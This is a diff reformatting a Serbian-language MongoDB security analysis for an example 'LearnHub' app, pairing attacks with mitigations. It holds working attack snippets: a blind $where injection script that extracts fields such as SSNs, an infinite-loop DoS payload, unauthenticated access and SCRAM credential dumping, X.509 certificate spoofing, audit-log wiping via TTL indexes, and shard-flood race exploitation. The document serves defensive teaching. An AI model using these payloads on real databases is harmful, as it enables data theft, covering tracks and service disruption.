-|                                                                       |
-| payload += f\"this.{field}.charAt({pos})==\'{ch}\') return true;\"    |
-|                                                                       |
-| payload += \" return false; //\"                                      |
-|                                                                       |
-| r = requests.get(f\'/api/search?name={payload}\')                     |
-|                                                                       |
-| if r.json():                                                          |
-|                                                                       |
-| extracted += ch                                                       |
-|                                                                       |
-| break                                                                 |
-|                                                                       |
-| else:                                                                 |
-|                                                                       |
-| break                                                                 |
-|                                                                       |
-| return extracted                                                      |
-+-----------------------------------------------------------------------+
+```
+def extract_field(student_id, field, max_len=20):
+    extracted = ''
+    for pos in range(max_len):
+        for ch in '0123456789abcdefghijklmnopqrstuvwxyz-@.':
+            payload = f"'; if(this._id=='{student_id}'&&"
+            payload += f"this.{field}.charAt({pos})=='{ch}') return true;"
+            payload += " return false; //"
+            r = requests.get(f'/api/search?name={payload}')
+            if r.json():
+                extracted += ch
+                break
+        else:
+            break
+    return extracted
+```
 
 Na ovaj način moguće je rekonstruisati osetljive podatke (npr. SSN)
 karakter po karakter uz relativno mali broj zahteva.
 
 Pored ekstrakcije, napadač može izvesti i **DoS napad** ubacivanjem
 beskonačne petlje:
-
-  -----------------------------------------------------------------------
-  GET /api/search?name=\'; while(true){}; //
-
-  -----------------------------------------------------------------------
+```
+GET /api/search?name=\'; while(true){}; //
+```
 
 Ovakav payload blokira MongoDB worker thread koji se ne može osloboditi
 bez prekida procesa. Sa dovoljnim brojem paralelnih zahteva, thread pool
@@ -1466,36 +1276,28 @@ treba prepisati nativnim MongoDB operatorima, koji su ne samo bezbedniji
 koristiti indekse. Na nivou server konfiguracije, JavaScript engine se
 može u potpunosti isključiti startup flagom \--noscripting, čime se
 onemogućavaju \$where i svi srodni JS operatori.
+```
+# POGREŠNO — ranjivo:
+query = {'$where': f"this.name == '{user_input}'"}
 
-+-----------------------------------------------------------------------+
-| \# POGREŠNO --- ranjivo:                                              |
-|                                                                       |
-| query = {\'\$where\': f\"this.name == \'{user_input}\'\"}             |
-|                                                                       |
-| \# ISPRAVNO --- nativni operator:                                     |
-|                                                                       |
-| query = {\'name\': user_input}                                        |
-+-----------------------------------------------------------------------+
+# ISPRAVNO — nativni operator:
+query = {'name': user_input}
+```
 
-+-----------------------------------------------------------------------+
-| \# Server nivo --- onemogućiti JS engine:                             |
-|                                                                       |
-| mongod \--noscripting                                                 |
-+-----------------------------------------------------------------------+
+```
+# Server nivo — onemogućiti JS engine:
+mongod --noscripting
+```
 
 Dodatno treba primeniti **whitelist validaciju unosa**:
+```
+import re
 
-+-----------------------------------------------------------------------+
-| import re                                                             |
-|                                                                       |
-| def validate(s):                                                      |
-|                                                                       |
-| if not re.match(r\'\^\[a-zA-Z0-9\\s\]{1,100}\$\', s):                 |
-|                                                                       |
-| raise ValueError(\'Neispravni karakteri\')                            |
-|                                                                       |
-| return s                                                              |
-+-----------------------------------------------------------------------+
+def validate(s):
+    if not re.match(r'^[a-zA-Z0-9\s]{1,100}$', s):
+        raise ValueError('Neispravni karakteri')
+    return s
+```
 
 Pored eliminacije \$where, potrebno je primeniti princip najmanjih
 privilegija nad DB korisnikom --- aplikacioni korisnik ne sme imati
@@ -1580,54 +1382,40 @@ U scenariju **unauthenticated instance**, napadač skenira port **27017**
 i pokušava direktnu konekciju. Ako je MongoDB pokrenut bez \--auth,
 moguće je pristupiti svim bazama bez ikakvih kredencijala, a alat poput
 **mongodump** može eksfiltrirati kompletnu bazu u jednoj komandi.
+```
+# Skeniranje MongoDB instance:
+nmap -p 27017 --script mongodb-info target_ip
 
-+-----------------------------------------------------------------------+
-| \# Skeniranje MongoDB instance:                                       |
-|                                                                       |
-| nmap -p 27017 \--script mongodb-info target_ip                        |
-|                                                                       |
-| \# Direktna konekcija bez autentifikacije:                            |
-|                                                                       |
-| mongo \--host target_ip                                               |
-|                                                                       |
-| \> show dbs                                                           |
-|                                                                       |
-| \> use learnhub                                                       |
-|                                                                       |
-| \> db.students.find()                                                 |
-+-----------------------------------------------------------------------+
+# Direktna konekcija bez autentifikacije:
+mongo --host target_ip
+> show dbs
+> use learnhub
+> db.students.find()
+```
 
 U scenariju **SCRAM credential harvest-a**, napadač sa privilegovanim
 pristupom čita kolekciju system.users i eksfiltrira StoredKey i
 ServerKey vrednosti. Ovi kriptografski dokazi mogu se koristiti direktno
 u SCRAM challenge-response procesu, bez poznavanja originalne lozinke.
-
-+-----------------------------------------------------------------------+
-| // Ekstrakcija SCRAM kredencijala:                                    |
-|                                                                       |
-| use admin                                                             |
-|                                                                       |
-| db.system.users.find({}, {credentials: 1})                            |
-|                                                                       |
-| // Vraća StoredKey i ServerKey za korisnike                           |
-+-----------------------------------------------------------------------+
+```
+// Ekstrakcija SCRAM kredencijala:
+use admin
+db.system.users.find({}, {credentials: 1})
+// Vraća StoredKey i ServerKey za korisnike
+```
 
 U scenariju **X.509 spoofing-a**, napadač generiše certifikat sa CN koji
 odgovara MongoDB korisniku. Ako server prihvata self-signed certifikate
 ili ima pogrešno konfigurisan CA trust, autentifikacija može biti
 uspešna bez lozinke.
+```
+# Generisanje lažnog certifikata:
+openssl req -new -key att.key -out att.csr \
+  -subj '/CN=apiUser/OU=apps/O=LearnHub'
 
-+-----------------------------------------------------------------------+
-| \# Generisanje lažnog certifikata:                                    |
-|                                                                       |
-| openssl req -new -key att.key -out att.csr \\                         |
-|                                                                       |
-| -subj \'/CN=apiUser/OU=apps/O=LearnHub\'                              |
-|                                                                       |
-| \# Povezivanje preko TLS autentifikacije:                             |
-|                                                                       |
-| mongo \--tls \--tlsCertificateKeyFile att.pem \--host target          |
-+-----------------------------------------------------------------------+
+# Povezivanje preko TLS autentifikacije:
+mongo --tls --tlsCertificateKeyFile att.pem --host target
+```
 
 **3) Mitigacija**
 
@@ -1638,40 +1426,28 @@ interfejsima**, a firewall pravila moraju blokirati port **27017** sa
 spoljašnjih mreža. Pošto MongoDB nema ugrađen account lockout,
 ograničenje broja neuspešnih pokušaja autentifikacije treba
 implementirati na nivou proxy-ja ili firewall-a.
+```
+# Pokretanje mongod sa autentifikacijom i TLS-om:
+mongod --auth --tlsMode requireTLS \
+  --tlsCertificateKeyFile /etc/ssl/mongodb.pem \
+  --bind_ip 127.0.0.1,10.0.0.5
+```
 
-+-----------------------------------------------------------------------+
-| \# Pokretanje mongod sa autentifikacijom i TLS-om:                    |
-|                                                                       |
-| mongod \--auth \--tlsMode requireTLS \\                               |
-|                                                                       |
-| \--tlsCertificateKeyFile /etc/ssl/mongodb.pem \\                      |
-|                                                                       |
-| \--bind_ip 127.0.0.1,10.0.0.5                                         |
-+-----------------------------------------------------------------------+
+```
+// Kreiranje admin korisnika:
+use admin
+db.createUser({
+  user: 'mongoAdmin',
+  pwd: passwordPrompt(),
+  roles: [{role: 'userAdminAnyDatabase', db: 'admin'}]
+})
+```
 
-+-----------------------------------------------------------------------+
-| // Kreiranje admin korisnika:                                         |
-|                                                                       |
-| use admin                                                             |
-|                                                                       |
-| db.createUser({                                                       |
-|                                                                       |
-| user: \'mongoAdmin\',                                                 |
-|                                                                       |
-| pwd: passwordPrompt(),                                                |
-|                                                                       |
-| roles: \[{role: \'userAdminAnyDatabase\', db: \'admin\'}\]            |
-|                                                                       |
-| })                                                                    |
-+-----------------------------------------------------------------------+
-
-+-----------------------------------------------------------------------+
-| \# Firewall --- blokirati pristup spolja:                             |
-|                                                                       |
-| iptables -A INPUT -p tcp \--dport 27017 -s 10.0.0.0/24 -j ACCEPT      |
-|                                                                       |
-| iptables -A INPUT -p tcp \--dport 27017 -j DROP                       |
-+-----------------------------------------------------------------------+
+```
+# Firewall — blokirati pristup spolja:
+iptables -A INPUT -p tcp --dport 27017 -s 10.0.0.0/24 -j ACCEPT
+iptables -A INPUT -p tcp --dport 27017 -j DROP
+```
 
 Za **X.509 autentifikaciju** obavezno koristiti organizacioni CA koji
 verifikuje identitet i nikada ne prihvatati self-signed certifikate.
@@ -1742,21 +1518,15 @@ Napad se može realizovati kroz dve strategije, u zavisnosti od cilja.
 Napadač briše postojeći TTL indeks nad audit log kolekcijom i kreira
 novi sa vrlo kratkim vremenom isteka. U roku od 1--2 minuta svi stari
 audit zapisi bivaju trajno obrisani.
+```
+// Uklanjanje audit tragova:
+db.audit_logs.dropIndex('timestamp_1')
 
-+-----------------------------------------------------------------------+
-| // Uklanjanje audit tragova:                                          |
-|                                                                       |
-| db.audit_logs.dropIndex(\'timestamp_1\')                              |
-|                                                                       |
-| db.audit_logs.createIndex(                                            |
-|                                                                       |
-| { timestamp: 1 },                                                     |
-|                                                                       |
-| { expireAfterSeconds: 60 }                                            |
-|                                                                       |
-| )                                                                     |
-+-----------------------------------------------------------------------+
-
+db.audit_logs.createIndex(
+  { timestamp: 1 },
+  { expireAfterSeconds: 60 }
+)
+```
 Rezultat: kompletna istorija aktivnosti nestaje veoma brzo sa svih
 replika.
 
@@ -1764,23 +1534,16 @@ replika.
 
 Napadač održava sopstvenu sesiju aktivnom stalnim resetovanjem timestamp
 polja, čime neutralizuje automatski logout mehanizam.
+```
+import time
 
-+-----------------------------------------------------------------------+
-| import time                                                           |
-|                                                                       |
-| while True:                                                           |
-|                                                                       |
-| db.sessions.update_many(                                              |
-|                                                                       |
-| {\'user_id\': attacker_id},                                           |
-|                                                                       |
-| {\'\$set\': {\'last_active\': datetime.utcnow()}}                     |
-|                                                                       |
-| )                                                                     |
-|                                                                       |
-| time.sleep(1800)                                                      |
-+-----------------------------------------------------------------------+
-
+while True:
+    db.sessions.update_many(
+        {'user_id': attacker_id},
+        {'$set': {'last_active': datetime.utcnow()}}
+    )
+    time.sleep(1800)
+```
 Efekat: sesija nikada ne ističe i omogućava dugotrajan neovlašćen
 pristup.
 
@@ -1790,34 +1553,22 @@ Ključna mera zaštite je primena **custom MongoDB role** koja ne sadrži
 privilegije za modifikaciju indeksa (createIndex, dropIndex, collMod).
 Promene indeksa treba ograničiti isključivo na DBA uloge uz stroge
 procedure odobravanja.
-
-+-----------------------------------------------------------------------+
-| // Custom rola bez indeks privilegija:                                |
-|                                                                       |
-| db.createRole({                                                       |
-|                                                                       |
-| role: \'appUser\',                                                    |
-|                                                                       |
-| privileges: \[{                                                       |
-|                                                                       |
-| resource: { db: \'learnhub\', collection: \'\' },                     |
-|                                                                       |
-| actions: \[\'find\', \'insert\', \'update\', \'remove\'\]             |
-|                                                                       |
-| }\],                                                                  |
-|                                                                       |
-| roles: \[\]                                                           |
-|                                                                       |
-| })                                                                    |
-+-----------------------------------------------------------------------+
-
+```
+// Custom rola bez indeks privilegija:
+db.createRole({
+  role: 'appUser',
+  privileges: [{
+    resource: { db: 'learnhub', collection: '' },
+    actions: ['find', 'insert', 'update', 'remove']
+  }],
+  roles: []
+})
+```
 Takođe je neophodno uvesti **monitoring promena indeksa** i generisati
 alert za svaku createIndex ili dropIndex operaciju.
-
-  -----------------------------------------------------------------------
-  db.setProfilingLevel(1, { slowms: 0 })
-
-  -----------------------------------------------------------------------
+```
+db.setProfilingLevel(1, { slowms: 0 })
+```
 
 Audit logovi i compliance-kritični podaci treba da budu **replicirani u
 eksterni sistem** (npr. SIEM ili syslog server) koji nije pod kontrolom
@@ -1892,23 +1643,16 @@ Napad koristi mogućnost da napadač veštački izazove intenzivno
 balansiranje, a zatim eksploatiše race condition tokom migracija.
 Strategija se zasniva na generisanju velikog broja upisa unutar istog
 shard-key raspona kako bi se stvorio neravnomeran raspored podataka.
+```
+# Flood jednog shard-a:
+import random
 
-+-----------------------------------------------------------------------+
-| \# Flood jednog shard-a:                                              |
-|                                                                       |
-| import random                                                         |
-|                                                                       |
-| for i in range(50000):                                                |
-|                                                                       |
-| db.enrollments.insert_one({                                           |
-|                                                                       |
-| \'student_id\': random.randint(0, 5000),                              |
-|                                                                       |
-| \'course_id\': 999                                                    |
-|                                                                       |
-| })                                                                    |
-+-----------------------------------------------------------------------+
-
+for i in range(50000):
+    db.enrollments.insert_one({
+        'student_id': random.randint(0, 5000),
+        'course_id': 999
+    })
+```
 Rezultat je neravnoteža chunk-ova koja pokreće intenzivne migracije.
 Napadač zatim šalje konkurentne upite tokom aktivne migracije i dobija
 nedosledne rezultate --- dokument može biti nevidljiv, vraćen kao
@@ -1916,14 +1660,10 @@ zastareo ili dupliran.
 
 Ako napadač ima mrežni pristup shard-ovima, može direktno pristupiti
 destination shard-u i dobiti duplikate zbog orphaned dokumenata.
-
-+-----------------------------------------------------------------------+
-| direct = MongoClient(\'shard1:27017\')                                |
-|                                                                       |
-| results = list(direct.learnhub.enrollments.find({\'student_id\':      |
-| 2500}))                                                               |
-+-----------------------------------------------------------------------+
-
+```
+direct = MongoClient('shard1:27017')
+results = list(direct.learnhub.enrollments.find({'student_id': 2500}))
+```
 Ovakvi duplikati mogu izazvati ozbiljne posledice poput duplih
 finansijskih transakcija ili pogrešnog poslovnog stanja.
 
@@ -1934,31 +1674,23 @@ window** kada je opterećenje sistema minimalno, čime se smanjuje
 verovatnoća race condition-a. Takođe, povećanje veličine chunk-a
 smanjuje broj migracija, dok redovno čišćenje orphaned dokumenata treba
 da bude deo održavanja sistema.
+```
+db.settings.update(
+  {_id: 'balancer'},
+  {$set: {activeWindow: {start: '02:00', stop: '06:00'}}}
+)
+```
 
-+-----------------------------------------------------------------------+
-| db.settings.update(                                                   |
-|                                                                       |
-| {\_id: \'balancer\'},                                                 |
-|                                                                       |
-| {\$set: {activeWindow: {start: \'02:00\', stop: \'06:00\'}}}          |
-|                                                                       |
-| )                                                                     |
-+-----------------------------------------------------------------------+
+```
+db.settings.save({_id: 'chunksize', value: 128})
+```
 
-  -----------------------------------------------------------------------
-  db.settings.save({\_id: \'chunksize\', value: 128})
-
-  -----------------------------------------------------------------------
-
-+-----------------------------------------------------------------------+
-| db.adminCommand({                                                     |
-|                                                                       |
-| cleanupOrphaned: \'learnhub.enrollments\',                            |
-|                                                                       |
-| startingFromKey: {student_id: 0}                                      |
-|                                                                       |
-| })                                                                    |
-+-----------------------------------------------------------------------+
+```
+db.adminCommand({
+  cleanupOrphaned: 'learnhub.enrollments',
+  startingFromKey: {student_id: 0}
+})
+```
 
 Za kritične upite preporučuje se korišćenje **readConcern majority** i
 čitanje sa PRIMARY čvora, čime se obezbeđuje pristup samo autoritativnim
